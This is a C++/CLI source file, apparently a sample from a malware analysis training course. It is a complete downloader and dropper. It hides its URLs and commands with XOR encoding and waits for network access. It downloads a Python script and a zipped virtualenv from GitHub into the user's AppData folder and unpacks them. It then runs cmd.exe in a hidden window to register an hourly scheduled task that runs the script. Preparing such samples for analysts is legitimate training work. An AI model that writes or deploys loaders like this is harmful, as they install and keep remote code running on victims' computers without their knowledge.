// Example 7 - Combo Platter.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include <iostream>
#include <string>
#include <Windows.h>
#include <comdef.h>
#include <shlwapi.h>
#include <Shlobj.h> 

#using <mscorlib.dll>
#using <System.dll>

#include <tchar.h>

using namespace std;
using namespace System;
using namespace System::Net;
using namespace System::IO;
using namespace System::Text;
using namespace System::IO::Compression;
using namespace System::Diagnostics;



void error(DWORD retval) {
	//Standard Error wrapper
	_com_error error(retval);
	wcout << error.ErrorMessage() << endl;
}

string encryptDecrypt(string toEncrypt) {
	//XOR Encrypt/Decrypt
	string output = toEncrypt;

	for (int i = 0; i < toEncrypt.size(); i++)
		output[i] = toEncrypt[i] ^ 0x5a;

	return output;
}

int main()
{
	//String^ url = "https://www.github.com";
	String^ url = gcnew String(encryptDecrypt("\x32\x2e\x2e\x2a\x29\x60\x75\x75\x2d\x2d\x2d\x74\x3d\x33\x2e\x32\x2f\x38\x74\x39\x35\x37").c_str());
	//String^ downloadzipurl = "https://raw.githubusercontent.com/SneakyNachos/MalwareAnalysisTraining/master/FakeService3/venv.zip";
	String^ downloadzipurl(gcnew String(encryptDecrypt("\x32\x2e\x2e\x2a\x29\x60\x75\x75\x28\x3b\x2d\x74\x3d\x33\x2e\x32\x2f\x38\x2f\x29\x3f\x28\x39\x35\x34\x2e\x3f\x34\x2e\x74\x39\x35\x37\x75\x9\x34\x3f\x3b\x31\x23\x14\x3b\x39\x32\x35\x29\x75\x17\x3b\x36\x2d\x3b\x28\x3f\x1b\x34\x3b\x36\x23\x29\x33\x29\xe\x28\x3b\x33\x34\x33\x34\x3d\x75\x37\x3b\x29\x2e\x3f\x28\x75\x1c\x3b\x31\x3f\x9\x3f\x28\x2c\x33\x39\x3f\x69\x75\x2c\x3f\x34\x2c\x74\x20\x33\x2a").c_str()));
	//String^ downloadscripturl = "https://raw.githubusercontent.com/SneakyNachos/MalwareAnalysisTraining/master/FakeService3/FakeService3.py";
	String^ downloadscripturl(gcnew String(encryptDecrypt("\x32\x2e\x2e\x2a\x29\x60\x75\x75\x28\x3b\x2d\x74\x3d\x33\x2e\x32\x2f\x38\x2f\x29\x3f\x28\x39\x35\x34\x2e\x3f\x34\x2e\x74\x39\x35\x37\x75\x9\x34\x3f\x3b\x31\x23\x14\x3b\x39\x32\x35\x29\x75\x17\x3b\x36\x2d\x3b\x28\x3f\x1b\x34\x3b\x36\x23\x29\x33\x29\xe\x28\x3b\x33\x34\x33\x34\x3d\x75\x37\x3b\x29\x2e\x3f\x28\x75\x1c\x3b\x31\x3f\x9\x3f\x28\x2c\x33\x39\x3f\x69\x75\x1c\x3b\x31\x3f\x9\x3f\x28\x2c\x33\x39\x3f\x69\x74\x2a\x23").c_str()));
	
	//Setting up ServicePointManager 
	Encoding^ ascii = Encoding::ASCII;
	Uri^ myUri = gcnew Uri(url);
	HttpWebResponse^ res = nullptr;
	ServicePointManager::SecurityProtocol = SecurityProtocolType::Tls | SecurityProtocolType::Ssl3 | SecurityProtocolType::Tls11 | SecurityProtocolType::Tls12;
	ServicePointManager::UseNagleAlgorithm = true;
	ServicePointManager::Expect100Continue = true;
	ServicePointManager::CheckCertificateRevocationList = true;
	ServicePoint^ mySP;
	
	HttpWebRequest ^wrGETURL;
	//Check if Alive
	while (TRUE) {
		wrGETURL = dynamic_cast<HttpWebRequest^>(HttpWebRequest::Create(url));
		res = dynamic_cast<HttpWebResponse^>(wrGETURL->GetResponse());
		if (res->StatusCode != HttpStatusCode::OK) {
			Sleep(5000);
		}
		else {
			break;
		}
	}
	
	mySP = wrGETURL->ServicePoint;
	//Get the script
	wrGETURL = dynamic_cast<HttpWebRequest^>(HttpWebRequest::Create(downloadscripturl));
	res = dynamic_cast<HttpWebResponse^>(wrGETURL->GetResponse());
	Console::WriteLine(res->StatusCode);

	//Read the script
	Stream ^objStream = res->GetResponseStream();
	StreamReader ^objReader = gcnew StreamReader(objStream);
	String^ scriptText = "";
	scriptText = objReader->ReadToEnd();	

	//Get user home directory
	char tempHomePath[MAX_PATH];
	long result = SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, tempHomePath);
	String^ homePath = gcnew String(tempHomePath);

	//Append Script path to home directory
	homePath += (gcnew String(encryptDecrypt("\x6\x6\x1b\x2a\x2a\x3e\x3b\x2e\x3b\x6\x6\x16\x35\x39\x3b\x36").c_str()));
	String^ scriptPath(homePath);
	scriptPath += (gcnew String(encryptDecrypt("\x6\x6\x1c\x3b\x31\x3f\x9\x3f\x28\x2c\x33\x39\x3f\x69\x74\x2a\x23").c_str()));
	//scriptPath += ("\\FakeService3.py");

	//Write Python Script
	File::WriteAllText(scriptPath, scriptText);

#ifdef _DEBUG
	Console::WriteLine("Finished FakeService3");
#endif

	wrGETURL = dynamic_cast<HttpWebRequest^>(HttpWebRequest::Create(downloadzipurl));
	res = dynamic_cast<HttpWebResponse^>(wrGETURL->GetResponse());

	//Setup WebClient
	WebClient ^webClient = gcnew WebClient();
	//webClient->Headers->Add("Accept: text/html, application/xhtml+xml, */*");
	webClient->Headers->Add(gcnew String(encryptDecrypt("\x1b\x39\x39\x3f\x2a\x2e\x60\x7a\x2e\x3f\x22\x2e\x75\x32\x2e\x37\x36\x76\x7a\x3b\x2a\x2a\x36\x33\x39\x3b\x2e\x33\x35\x34\x75\x22\x32\x2e\x37\x36\x71\x22\x37\x36\x76\x7a\x70\x75\x70").c_str()));
	//webClient->Headers->Add("User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)");
	webClient->Headers->Add(gcnew String(encryptDecrypt("\xf\x29\x3f\x28\x77\x1b\x3d\x3f\x34\x2e\x60\x7a\x17\x35\x20\x33\x36\x36\x3b\x75\x6f\x74\x6a\x7a\x72\x39\x35\x37\x2a\x3b\x2e\x33\x38\x36\x3f\x61\x7a\x17\x9\x13\x1f\x7a\x63\x74\x6a\x61\x7a\xd\x33\x34\x3e\x35\x2d\x29\x7a\x14\xe\x7a\x6c\x74\x6b\x61\x7a\xd\x15\xd\x6c\x6e\x61\x7a\xe\x28\x33\x3e\x3f\x34\x2e\x75\x6f\x74\x6a\x73").c_str()));
	
	//Setup the zip files path
	String^ zipPath(homePath);
	//zipPath += ("\\venv.zip");
	zipPath += (gcnew String(encryptDecrypt("\x6\x6\x2c\x3f\x34\x2c\x74\x20\x33\x2a").c_str()));

	//Download zip file
	webClient->DownloadFile(gcnew Uri(downloadzipurl), zipPath);

#ifdef _DEBUG
	Console::WriteLine("Got zip");
#endif

	String^ extractPath(homePath);
	try {
		//Extract Zip file
		ZipFile::ExtractToDirectory(zipPath, extractPath);
#ifdef _DEBUG
		Console::WriteLine("Done");
#endif
	}
	catch (Exception ^e) {
		//Probably the zip file already exists
#ifdef _DEBUG
		Console::WriteLine("Failed to extract zip");
		Console::WriteLine(e->Message);
#endif
	}

	//Setup python script path
	String^ pythonPath(extractPath);
	//pythonPath += ("\\venv\\Scripts\\python.exe");
	pythonPath += (gcnew String(encryptDecrypt("\x6\x6\x2c\x3f\x34\x2c\x6\x6\x9\x39\x28\x33\x2a\x2e\x29\x6\x6\x2a\x23\x2e\x32\x35\x34\x74\x3f\x22\x3f").c_str()));
	
	//schtasks /Create /SC HOURLY /TN PythonTask /TR "PATH_TO_PYTHON_EXE PATH_TO_PYTHON_SCRIPT"
	//String^ command(("schtasks /Create /SC HOURLY /TN PythonTask /TR \""));

	//Setup string for scheduled task
	String^ command(gcnew String(encryptDecrypt("\x29\x39\x32\x2e\x3b\x29\x31\x29\x7a\x75\x19\x28\x3f\x3b\x2e\x3f\x7a\x75\x9\x19\x7a\x12\x15\xf\x8\x16\x3\x7a\x75\xe\x14\x7a\xa\x23\x2e\x32\x35\x34\xe\x3b\x29\x31\x7a\x75\xe\x8\x7a\x78").c_str()));
	command += (pythonPath);
	command += (" ");
	command += (scriptPath);
	command += ("\"");

#ifdef _DEBUG
	Console::WriteLine(command);
#endif

	//Create new cmd.exe process and run the schduled tasks command
	Process^ process = gcnew Process();
	ProcessStartInfo^ startInfo = gcnew ProcessStartInfo();
	startInfo->WindowStyle = ProcessWindowStyle::Hidden;
	startInfo->FileName = "cmd.exe";
	startInfo->Arguments = command;
	process->StartInfo = startInfo;
	process->Start();

#ifdef _DEBUG
	Console::WriteLine("Command completed");
#endif

	





		
	
	
	
	
}

